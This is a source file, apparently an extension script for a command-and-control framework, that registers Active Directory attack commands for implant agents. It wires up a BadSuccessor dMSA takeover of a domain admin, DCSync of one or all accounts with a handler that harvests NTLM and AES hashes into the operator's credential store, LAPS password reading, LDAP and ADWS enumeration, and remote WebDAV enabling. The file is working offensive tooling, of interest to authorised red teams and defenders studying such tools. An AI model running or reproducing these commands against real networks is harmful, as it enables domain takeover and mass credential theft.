var metadata = {
    name: "AD-BOF",
    description: "Active Directory Exploitation BOFs"
};



var cmd_adwssearch = ax.create_command("adwssearch", "Executes ADWS query", "adwssearch (objectClass=*) -attributes *,ntsecuritydescriptor --dc DC1");
cmd_adwssearch.addArgString("query", true);
cmd_adwssearch.addArgFlagString( "-a", "attributes", "Comma-separated attributes to retrieve (default: all attributes)", "");
cmd_adwssearch.addArgFlagString( "--dc", "dc", "Target domain controller (e.g., 'dc01.domain.local'). If omitted, auto-discovers DC.", "");
cmd_adwssearch.addArgFlagString( "--dn", "dn", "Custom base DN (e.g., 'DC=domain,DC=local'). If not specified, auto-derives from user context or target.", "");
cmd_adwssearch.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let query      = parsed_json["query"];
    let attributes = parsed_json["attributes"];
    let dc         = parsed_json["dc"];
    let dn         = parsed_json["dn"];

    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr", [query, attributes, dc, dn]);
    let bof_path = ax.script_dir() + "_bin/adws_search." + ax.arch(id) + ".o";
    let message = "BOF implementation: adws search";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});





var cmd_badtakeover = ax.create_command("badtakeover", "BOF for performing account takeover using the BadSuccessor technique", "badtakeover \"OU=TestOU,DC=domain,DC=dom\" attacker_dmsa S-1-5-21-....-1104 \"CN=domainadmin,CN=Users,DC=domain,DC=dom\" domain.dom");
cmd_badtakeover.addArgString("ou",      true, "Target OU to write the malicious dMSA");
cmd_badtakeover.addArgString("account", true, "The name of the new dMSA to create");
cmd_badtakeover.addArgString("sid",     true, "The Security ID (SID) of your current context");
cmd_badtakeover.addArgString("dn",      true, "The target user objects DN");
cmd_badtakeover.addArgString("domain",  true, "The current domain");
cmd_badtakeover.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let ou      = parsed_json["ou"];
    let account = parsed_json["account"];
    let sid     = parsed_json["sid"];
    let dn      = parsed_json["dn"];
    let domain  = parsed_json["domain"];

    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr,cstr", [ou, account, sid, dn, domain]);
    let bof_path = ax.script_dir() + "_bin/badtakeover." + ax.arch(id) + ".o";
    let message = "Exploiting BadSuccessor...";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});





let dcsync_handler = function (task) {
    const lines = task.text.split(/\r?\n/);
    const results = [];
    let dc = "";
    let currentName = null;
    let currentObjectType = null;

    const reDC = /^\[\*\]\s+Discovered DC:\s+(.+)$/;
    const reObject = /^\[\*\]\s+(User|Computer|Trust account|Object):\s+(.+)$/;
    const reNT = /^nt:\s*([0-9a-f]{32})$/;
    const reAES256 = /^aes256:\s*([0-9a-f]{64})$/;
    const reAES128 = /^aes128:\s*([0-9a-f]{32})$/;

    function parseName(rawName) {
        const idx = rawName.indexOf("\\");
        if (idx === -1) return { name: rawName, realm: null };
        return {
            name: rawName.slice(idx + 1),
            realm: rawName.slice(0, idx)
        };
    }

    function pushHash(hashType, hashValue) {
        if (!currentName || !hashValue) return;

        const nameParts = parseName(currentName);
        const tag = currentObjectType === "Computer" ? "computer" : "";

        results.push({
            username: nameParts.name,
            type: hashType,
            password: hashValue,
            storage: "dcsync",
            tag: tag,
            realm: nameParts.realm,
            host: dc
        });
    }

    for (const line of lines) {
        if (results.length > 1000) {
            ax.credentials_add_list(results);
            results.length = 0;
        }

        const trimmed = line.trim();
        if (!trimmed) continue;

        let m = reDC.exec(trimmed);
        if (m && !dc) { dc = m[1]; continue; }

        m = reObject.exec(trimmed);
        if (m) {
            currentObjectType = m[1];
            currentName = m[2];
            continue;
        }

        if (!currentName) continue;

        m = reNT.exec(trimmed);
        if (m) { pushHash("ntlm", m[1]); continue; }

        m = reAES256.exec(trimmed);
        if (m) { pushHash("aes256", m[1]); continue; }

        m = reAES128.exec(trimmed);
        if (m) pushHash("aes128", m[1]);
    }

    if (results.length) ax.credentials_add_list(results);
};

var _cmd_dcsync_single = ax.create_command( "single", "Perform a DCSync operation on a single user", "dcsync single jane.doe -dc dc01.corp.local --ldaps" );
_cmd_dcsync_single.addArgString("target", true, "Target username or distinguished name");
_cmd_dcsync_single.addArgFlagString("-ou", "ou_path", false, "OU path to search (optional)");
_cmd_dcsync_single.addArgFlagString("-dc", "dc_address", false, "Domain Controller address");
_cmd_dcsync_single.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_dcsync_single.addArgBool("--only-nt", "Only ntlm hashes");
_cmd_dcsync_single.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){

    function identifyInputType(input) {
        const usernameRegex = /^[a-zA-Z0-9._-]{1,64}$/;
        const dnRegex = /^(?:[A-Z]+=[^,]+)(?:,(?:[A-Z]+=[^,]+))*$/i;
        if (dnRegex.test(input)) {
            return 1;
        } else if (usernameRegex.test(input)) {
            return 0;
        } else {
            return 0;
        }
    }

    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let ou_path = parsed_json["ou_path"] || "";
    let dc_address = parsed_json["dc_address"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;
    let only_nt = parsed_json["--only-nt"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,int,int", [target, is_dn, ou_path, dc_address, use_ldaps, only_nt]);
    let bof_path = ax.script_dir() + "_bin/dcsync-single." + ax.arch(id) + ".o";
    ax.execute_alias_handler(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `DCSyncing user ${target}...`, dcsync_handler);
});

var _cmd_dcsync_all = ax.create_command( "all", "Perform DCSync operations for all users in the domain", "dcsync all -ou 'OU=Users,DC=corp,DC=local' -dc dc01.corp.local --ldaps" );
_cmd_dcsync_all.addArgFlagString("-ou", "ou_path", false, "OU path to search (optional)");
_cmd_dcsync_all.addArgFlagString("-dc", "dc_address", false, "Domain Controller address");
_cmd_dcsync_all.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_dcsync_all.addArgBool("--only-nt", "Only ntlm hashes");
_cmd_dcsync_all.addArgBool("--only-users", "Only User and Trust accounts");
_cmd_dcsync_all.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let ou_path = parsed_json["ou_path"] || "";
    let dc_address = parsed_json["dc_address"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;
    let only_nt = parsed_json["--only-nt"] ? 1 : 0;
    let only_users = parsed_json["--only-users"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,cstr,int,int,int", [ou_path, dc_address, use_ldaps, only_nt, only_users]);
    let bof_path = ax.script_dir() + "_bin/dcsync-all." + ax.arch(id) + ".o";
    ax.execute_alias_handler(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "DCSyncing all users...", dcsync_handler);
});

var cmd_dcsync = ax.create_command( "dcsync", "Perform DCSync operations (DCSync-BOF)", "dcsync {subcommand} [options]" );
cmd_dcsync.addSubCommands([_cmd_dcsync_single]);
cmd_dcsync.addSubCommands([_cmd_dcsync_all]);





var cmd_ldapsearch = ax.create_command("ldapsearch", "Executes LDAP query", "ldapsearch (objectClass=*) -a *,ntsecuritydescriptor -c 40 -s 2 --dc DC1");
cmd_ldapsearch.addArgString("query", true);
cmd_ldapsearch.addArgFlagString( "-a", "attributes", "The attributes to retrieve", "*");
cmd_ldapsearch.addArgFlagInt( "-c", "count", "The result max size", 0);
cmd_ldapsearch.addArgFlagInt( "-s", "scope", "The scope to use: 1 = BASE, 2 = LEVEL, 3 = SUBTREE", 3);
cmd_ldapsearch.addArgFlagString( "--dc", "dc", "Hostname or IP to perform the LDAP connection on", "");
cmd_ldapsearch.addArgFlagString( "--dn", "dn", "The LDAP query basee", "");
cmd_ldapsearch.addArgBool( "--ldaps", "Using of LDAPS");
cmd_ldapsearch.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let query      = parsed_json["query"];
    let attributes = parsed_json["attributes"];
    let count      = parsed_json["count"];
    let scope      = parsed_json["scope"];
    let dc         = parsed_json["dc"];
    let dn         = parsed_json["dn"];
    let ldaps = 0;

    if (parsed_json["--ldaps"]) { ldaps = 1; }

    let bof_params = ax.bof_pack("wstr,cstr,int,int,cstr,cstr,int", [query, attributes, count, scope, dc, dn, ldaps]);
    let bof_path = ax.script_dir() + "_bin/ldapsearch." + ax.arch(id) + ".o";
    let message = "BOF implementation: ldapsearch";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});



var _cmd_ldapq_computers = ax.create_command("computers", "Get list of computers from ldap", "ldapq computers");
_cmd_ldapq_computers.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let hook = function (task)
    {
        var blocks = task.text.split("--------------------");
        var arr = [];

        for (var i = 0; i < blocks.length; i++) {
            var block = blocks[i].trim();
            if (block.length === 0 || block.indexOf("cn:") === -1) continue;

            var lines = block.split("\n");
            var obj = {};
            for (var j = 0; j < lines.length; j++) {
                var line = lines[j].trim();
                if (line.length === 0) continue;
                var parts = line.split(":");
                var key = parts[0].trim();
                var value = parts.slice(1).join(":").trim();
                if (key === "cn") obj.computer = value;
                else if (key === "dNSHostName") obj.domain = value.split(".").slice(1).join(".");
                else if (key === "operatingSystem") {
                    obj.os_desc = value;
                    if (value.toLowerCase().indexOf("windows") !== -1)    obj.os = "windows";
                    else if (value.toLowerCase().indexOf("linux") !== -1) obj.os = "linux";
                    else if (value.toLowerCase().indexOf("mac") !== -1)   obj.os = "macos";
                    else obj.os = "unknown";
                }
                else if (key === "userAccountControl") {
                    var uac = parseInt(value, 10);
                    if ((uac & 2) === 0) continue;
                }
            }
            obj.alive = true;
            obj.tag = "";
            obj.info = "collected from ldap";

            arr.push(obj);
        }
        if(arr.length > 0)  ax.targets_add_list(arr);

        return task;
    }

    let bof_params = ax.bof_pack("wstr,cstr,int,int,cstr,cstr,int", ["(objectclass=computer)", "cn,operatingSystem,userAccountControl,dNSHostName", 0, 3, "", "", 0]);
    let bof_path = ax.script_dir() + "_bin/ldapsearch." + ax.arch(id) + ".o";
    let message = "BOF ldapsearch: query computers";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message, hook);
});

var cmd_ldapq = ax.create_command("ldapq", "Ldap query objects", "ldapq computers");
cmd_ldapq.addSubCommands([_cmd_ldapq_computers]);





var cmd_readlaps = ax.create_command("readlaps", "Read LAPS password for a computer", "readlaps -dc dc01.domain.local -target WINCLIENT");
cmd_readlaps.addArgFlagString("-dc", "dc", "Target domain controller (e.g., 'dc01.domain.local'). Hostname preferred over IP for LDAP.", "");
cmd_readlaps.addArgFlagString("-dn", "dn", "Root DN (e.g., 'DC=domain,DC=local'). If not specified, derived from agent domain.", "");
cmd_readlaps.addArgFlagString("-target", "target", "Target computer sAMAccountName (e.g., 'WINCLIENT$')", "");
cmd_readlaps.addArgFlagString("-target-dn", "target_dn", "Target computer Distinguished Name (e.g., 'CN=WINCLIENT,OU=Computers,DC=domain,DC=local')", "");
cmd_readlaps.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let dc        = parsed_json["dc"];
    let dn        = parsed_json["dn"];
    let target    = parsed_json["target"];
    let target_dn = parsed_json["target_dn"];

    if (!target && !target_dn) {
        throw new Error("Either -target (sAMAccountName) or -target-dn (Distinguished Name) must be specified");
        return;
    }

    if (target && target_dn) {
        throw new Error("Cannot specify both -target and -target-dn");
        return;
    }

    // If -dn not specified, derive from agent domain
    if (!dn || dn === "") {
        let domain = ax.agent_info(id, "domain")
        if (domain) {
            let parts = domain.split(".");
            dn = parts.map(part => "DC=" + part).join(",");
        } else {
            throw new Error("Could not auto-detect DN. Agent domain not available. Please specify -dn manually.");
            return;
        }
    }

    // Strip quotes from target values if present
    if (dc) {
        dc = dc.replace(/^['"]|['"]$/g, '');
    }
    if (target) {
        target = target.replace(/^['"]|['"]$/g, '');
    }
    if (target_dn) {
        target_dn = target_dn.replace(/^['"]|['"]$/g, '');
    }

    // Build the LDAP search filter
    let searchFilter = "";
    let message = "";
    if (target) {
        // Ensure target ends with $ for computer accounts if not already present
        let computerName = target;
        if (!computerName.endsWith("$")) {
            computerName = computerName + "$";
        }
        searchFilter = "(&(objectClass=computer)(sAMAccountName=" + computerName + "))";
        message = `Read LAPS password for ${computerName}`;
    } else {
        searchFilter = "(&(objectClass=computer)(distinguishedName=" + target_dn + "))";
        message = `Read LAPS password for ${target_dn}`;
    }

    let bof_params = ax.bof_pack("cstr,cstr,cstr", [dc, dn, searchFilter]);
    let bof_path = ax.script_dir() + "_bin/readlaps." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});





var _cmd_webdav_enable = ax.create_command("enable", "Enable the WebDAV client service without elevated permissions", "webdav enable");
_cmd_webdav_enable.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "_bin/webdav_enable." + ax.arch(id) + ".o";
    let message = "Enable the WebDAV client service";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, message);
});

var _cmd_webdav_status = ax.create_command("status", "Determine if the WebDAV is running on a remote system", "webdav status 192.168.0.1,192.168.0.2");
_cmd_webdav_status.addArgString("hosts", "", "127.0.0.1");
_cmd_webdav_status.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let hosts = parsed_json["hosts"];

    let bof_params = ax.bof_pack("cstr", [hosts]);
    let bof_path = ax.script_dir() + "_bin/webdav_status." + ax.arch(id) + ".o";
    let message = "Task: Check WebDAV status";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});

var cmd_webdav = ax.create_command("webdav", "Manage webdav service", "webdav enable");
cmd_webdav.addSubCommands([_cmd_webdav_enable]);
cmd_webdav.addSubCommands([_cmd_webdav_status]);



var group_exec = ax.create_commands_group("AD-BOF", [cmd_adwssearch, cmd_badtakeover, cmd_dcsync, cmd_ldapsearch, cmd_ldapq, cmd_readlaps, cmd_webdav]);
ax.register_commands_group(group_exec, ["beacon", "gopher", "kharon"], ["windows"], []);



ax.script_import(ax.script_dir() + "ADCS-BOF/ADCS.axs")
ax.script_import(ax.script_dir() + "Kerbeus-BOF/kerbeus.axs")
ax.script_import(ax.script_dir() + "SQL-BOF/SQL.axs")
ax.script_import(ax.script_dir() + "LDAP-BOF/LDAP.axs")
ax.script_import(ax.script_dir() + "RelayInformer/RelayInformer.axs")